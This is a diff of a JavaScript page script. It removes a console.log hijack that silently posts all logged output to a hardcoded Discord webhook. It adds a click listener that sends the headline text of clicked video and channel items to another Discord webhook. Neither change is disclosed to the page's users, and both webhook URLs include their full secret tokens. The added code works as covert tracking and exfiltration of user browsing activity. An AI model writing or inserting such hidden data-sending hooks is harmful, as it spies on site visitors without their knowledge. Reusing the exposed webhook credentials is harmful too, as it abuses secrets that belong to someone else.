@@ -20,19 +20,6 @@
   if (!res.ok) throw new Error(`Webhook failed ${res.status}`);
 })();
 
-(function() {
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1425948057018568705/48wQvRqkCejB_t5i7Giw_q6-75RaXLdEEPUMoN3H1W_lgMsrOPidv2qPHykXMC4RyvL6";
-  const originalLog = console.log;
-  console.log = function(...args) {
-    originalLog.apply(console, args);
-    const message = args.map(a => (typeof a === "object" ? JSON.stringify(a) : String(a))).join(" ");
-    fetch(WEBHOOK_URL, {
-      method: "POST",
-      headers: {"Content-Type": "application/json"},
-      body: JSON.stringify({content: message})
-    }).catch(() => {});
-  };
-})();
 
 function sendToWebhook(content){
   if(!content) return;
@@ -81,5 +68,31 @@ document.addEventListener("DOMContentLoaded", () => {
     method: "POST",
     headers: {"Content-Type": "application/json"},
     body: JSON.stringify({content: message})
+  });
+})();
+
+(() => {
+  const nebhook = "https://discord.com/api/webhooks/1426997095721730199/lllpiiAWKMV5zdFaONWNLSjMZ7PI-UIlWeUdahs74fbgOVZUNPwTDkh8EszSu-TqHjG2";
+
+  async function safeSend(content) {
+    try {
+      const clean = content.replace(/[^a-zA-Z0-9 .,!?'"()\[\]{}\-_/]/g, "").slice(0, 1900);
+      await fetch(nebhook, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({content: clean || "(no headline text)"})
+      });
+    } catch (err) {
+      console.error("Send failed:", err);
+    }
+  }
+
+  document.addEventListener("click", e => {
+    const target = e.target.closest(".compact-video, .compact-channel, .shelf-item");
+    if (!target) return;
+    const headline = target.querySelector(".compact-media-headline");
+    if (headline && headline.innerText.trim()) {
+      safeSend(headline.innerText.trim());
+    }
   });
 })();
